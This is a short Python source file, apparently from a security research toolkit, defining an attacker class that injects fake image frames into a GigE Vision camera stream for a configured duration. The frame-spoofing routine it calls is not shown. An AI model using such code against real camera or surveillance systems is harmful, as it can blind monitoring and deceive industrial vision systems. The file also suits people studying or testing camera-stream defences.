import logging

from attacker import GigEAttacker


class GigEAttackerFrameInjection(GigEAttacker):
    """
    GigE Vision attacker that performs frame injection attacks.

    This class implements a specific type of attack where entire fake frames
    are injected into the GigE Vision stream.
    """

    def attack(self) -> None:
        """
        Execute the frame injection attack.

        This method sets up the GigE link and injects fake frames for the specified duration.
        """
        self.set_gige_link()
        time_left = self.config["timing"]["attack_duration_in_seconds"]
        self.log(
            f"Attempting full frame injection for {time_left} seconds", logging.DEBUG
        )
        self.gige_link.fake_still_image(
            img_path=self.config["injection"]["fake_path"],
            duration=time_left,
            fps=self.config["timing"]["fps"],
        )

    def run_attack_stage(self) -> None:
        """
        Run the attack stage for frame injection.

        This method overrides the base class implementation to directly execute the attack.
        """
        self.attack()
